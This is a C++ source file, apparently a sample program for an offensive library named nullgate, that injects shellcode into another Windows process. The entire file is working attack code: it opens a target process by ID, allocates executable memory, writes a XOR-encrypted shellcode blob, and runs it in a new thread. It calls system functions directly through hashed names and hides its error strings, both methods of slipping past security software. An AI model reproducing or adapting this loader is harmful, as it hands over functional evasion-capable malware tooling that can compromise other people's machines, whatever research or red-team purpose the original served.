#include <ntdef.h>
#include <nullgate/obfuscation.hpp>
#include <nullgate/syscalls.hpp>
#include <sample/ntapi.hpp>
#include <stdexcept>
#include <string>
#include <windows.h>
#include <winnt.h>

namespace ng = nullgate;

int main(int argc, char *argv[]) {
  const size_t shellcodeSize = 276; // Size of shellcode before encryption
  const std::string encryptedShellcode =
      "IAVFdwtpNAI+ek5rKnNxQHZWQX8Ha2QHbHseY3xxdEFzUEV3AGs1BG5/"
      "H2txIXRCcFZFdws4ZARpch9rcSF0QnRWRXcLOGYEbXofa3klI0dyB0UuBz5iBztzH2t6ciJA"
      "JwVCLAVrZlVoeBkwe3N1QSVXEnYDPmUHaHtIYixxJBRzVEV+"
      "BmtlDmAoHmF7c3kSclRCLAdiYQc8ehMxcXN5SHZWQX8DamUOYH9IY353d0dyXkF+"
      "V2pkBmAoH2t4e3VEfgRFfwFqZQ9oe09jLHB0RnJeFylQY2UHYCgYZ3F7dUh2VxV5Bz5iBztz"
      "H2t6ciJAJwVFflBrMg9oLh9ieXIiQXVeFH8EbzcHbCkbYH0gc0R2XkV6AGM1B29/"
      "T2t8e3VEfgRFfwFuZQ9oe09jf3V1QX4EQSwHYmUCYCgfY3ggdUl2VxV/"
      "B2tpVGh+E2t9e3FBIlZFfgZiZQdtch42fHp0EXJXRHcHa2QPbHseMn17eUMjBUN/"
      "B2tkBD4sTmN8e3VBc19ELgdiaVRpeE5qfHQnFiAAFykGPmUOOisbYnlzcUB2VkF/"
      "A2phBmh6H2txJ3kUdldBfgNqYQZse0kyenJ5EnAASXhVPDUDOihOY3gncxF2B0V+UTswAGF/"
      "STdwJycWIlNFdwtpMgJqchgweXV2E3YHSX9VODQGb38bZishdUd3VUZ9BTxnV2h6Hmp9cnlJ"
      "IgcXKVdvZwVuex0wf3BzFXBTRncFb2EG";

  if (argc != 2)
    throw std::runtime_error(
        ng::obfuscation::xorDecode("ERQeIVR6MEQ/akg8PC01LCg="));

  ng::syscalls syscalls;
  DWORD PID = std::stoi(argv[1]);
  HANDLE processHandle = nullptr;
  OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), nullptr};
  CLIENT_ID clientId = {.UniqueProcess = reinterpret_cast<HANDLE>(PID),
                        .UniqueThread = NULL};
  auto status = syscalls.SCall<NtOpenProcess>(
      ng::obfuscation::fnv1Const("NtOpenProcess"), &processHandle,
      PROCESS_ALL_ACCESS, &objectAttrs, &clientId);
  if (!NT_SUCCESS(status))
    throw std::runtime_error(
        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naSJhGCcIFSNWej5YeD5DNmkzM"
                                   "x8lAwI8H3o3VzEmTjdpNCgELlxR") +
        std::to_string(status));

  PVOID buf = NULL;
  size_t regionSize = shellcodeSize;
  status = syscalls.SCall<NtAllocateVirtualMemory>(
      ng::obfuscation::fnv1Const("NtAllocateVirtualMemory"), processHandle,
      &buf, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (!NT_SUCCESS(status)) {
    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                            processHandle);
    throw std::runtime_error(
        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naTEkAyMUByoTNzRbNzhScyAtY"
                                   "QQuA1E/QTUyUys5B3MvIigcIwJROFouOQx4") +
        std::to_string(status));
  }

  // A thread cannot be created if it's context hasn't been initialized(At least
  // it didn't work for me)
  char fakebuf[] = "pwned";
  status = syscalls.SCall<NtWriteVirtualMemory>(
      ng::obfuscation::fnv1Const("NtWriteVirtualMemory"), processHandle, buf,
      reinterpret_cast<PVOID>(fakebuf), sizeof(fakebuf), nullptr);
  if (!NT_SUCCESS(status)) {
    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                            processHandle);
    throw std::runtime_error(ng::obfuscation::xorDecode(
                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
                             std::to_string(status));
  }

  HANDLE threadHandle = NULL;
  auto startRoutine = reinterpret_cast<PUSER_THREAD_START_ROUTINE>(buf);
  status = syscalls.SCall<NtCreateThreadEx>(
      ng::obfuscation::fnv1Const("NtCreateThreadEx"), &threadHandle,
      THREAD_ALL_ACCESS, &objectAttrs, processHandle, startRoutine, nullptr,
      THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, nullptr);
  if (!NT_SUCCESS(status)) {
    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                            processHandle);
    throw std::runtime_error(
        ng::obfuscation::xorDecode("BQkEI1c0dkJ4KVk2KDckUCgDBm9HMiNTOS4LOidjN"
                                   "RgjRgE9XDk0RStmCzUoKi0VIkYGJkcyaxY=") +
        std::to_string(status));
  }

  auto decryptedShellcode =
      ng::obfuscation::hex2bin(ng::obfuscation::xorDecode(encryptedShellcode));

  status = syscalls.SCall<NtWriteVirtualMemory>(
      ng::obfuscation::fnv1Const("NtWriteVirtualMemory"), processHandle, buf,
      reinterpret_cast<PVOID>(decryptedShellcode.data()),
      decryptedShellcode.size(), nullptr);
  if (!NT_SUCCESS(status)) {
    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                            processHandle);
    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                            threadHandle);
    throw std::runtime_error(ng::obfuscation::xorDecode(
                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
                             std::to_string(status));
  }

  status = syscalls.SCall<NtResumeThread>(
      ng::obfuscation::fnv1Const("NtResumeThread"), threadHandle, nullptr);
  if (!NT_SUCCESS(status)) {
    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                            processHandle);
    syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                            threadHandle);
    throw std::runtime_error(
        ng::obfuscation::xorDecode(
            "BQkEI1c0dkJ4OE4gPC4kUDIOAypSPn0WPitCPywnYQcvEhl1Ew==") +
        std::to_string(status));
  }

  syscalls.SCall<NtWaitForSingleObject>(
      ng::obfuscation::fnv1Const("NtWaitForSingleObject"), threadHandle, false,
      nullptr);

  syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"), threadHandle);
  syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"), processHandle);
}
